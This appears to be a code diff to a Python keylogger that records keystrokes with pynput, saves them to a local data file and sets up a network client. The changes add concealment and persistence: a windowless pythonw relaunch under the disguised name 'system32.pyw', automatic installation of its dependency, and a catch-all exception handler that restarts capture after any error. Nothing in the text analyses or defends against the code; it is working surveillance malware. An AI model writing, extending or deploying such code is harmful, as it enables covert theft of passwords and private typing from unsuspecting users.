@@ -1,3 +1,4 @@
+#! C:\python38\pythonw.exe
 try:
 	import os
 	from pynput.keyboard import Key, Listener
@@ -7,9 +8,9 @@ try:
 except ModuleNotFoundError:
 	print('an error has occured')
 	#Process to install pynput.keyboard module
-	os.system('pip3 install pynput')
+	os.system('python3 -m pip install pynput')
 	#Rerun
-	os.system('python3 system32.py')
+	os.system('pythonw system32.pyw')
 
 keys = []
 _dir = 'x64/data.enc'
@@ -17,6 +18,7 @@ net = _net.Client()
 def preload():
 	with Listener(on_press=on_press) as listener:
 		listener.join()
+
 def write_f():
 	_temp = ""
 	with open(_dir, 'w') as f:
@@ -47,9 +49,12 @@ def on_press( key ):
 
 
 if __name__ =='__main__':
+	print("[ * ] Memuat data")
 	try:
 		preload()
 	except KeyboardInterrupt:
 		preload()
 	except EOFError:
+		preload()
+	except:
 		preload()
